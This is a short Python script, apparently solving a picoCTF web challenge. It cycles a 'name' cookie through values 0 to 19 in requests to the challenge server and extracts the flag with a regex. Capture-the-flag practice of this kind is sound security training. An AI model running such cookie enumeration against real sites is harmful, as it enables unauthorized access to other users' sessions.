import requests, re

url = "http://mercury.picoctf.net:21485/check"

for i in range(20):
	cookie  = {'name': str(i)}
	res = requests.get(url , cookies=cookie)
	flag = re.findall('picoCTF{.*}', res.text)

	if flag :
		print('-----Binggo-----')
		print(flag)
		break